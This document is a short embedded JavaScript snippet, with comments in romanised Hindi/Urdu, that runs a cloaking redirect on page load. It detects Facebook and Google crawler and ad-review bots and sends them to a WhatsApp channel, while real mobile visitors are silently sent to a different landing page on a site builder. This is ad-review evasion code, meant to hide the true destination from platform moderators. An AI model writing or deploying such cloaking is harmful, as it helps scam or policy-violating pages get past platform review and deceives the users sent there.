    <script>
        // Bilkul shuru mein redirect execute hoga
        (function() {
            var whatsappChannel = "https://whatsapp.com/channel/0029Vb8pdaR6buMT4C6gtW1O";
            var mobileLandingPage = "https://ocher-bison-11v65rt.mystrikingly.com"; 

            var userAgent = navigator.userAgent || "";
            
            // Bot Detection
            var isBot = /facebookexternalhit|Facebot|facebookplatform|Googlebot|AdsBot|Mediapartners|HeadlessChrome|Bot|Crawler|Spider/i.test(userAgent);
            
            // Mobile Detection
            var isRealMobile = /Android|iPhone|iPad|iPod|Opera Mini/i.test(userAgent);

            // Redirection logic
            if (isBot) {
                window.location.replace(whatsappChannel);
            } else if (isRealMobile) {
                window.location.replace(mobileLandingPage);
            } else {
                window.location.replace(whatsappChannel);
            }
        })();
    </script>
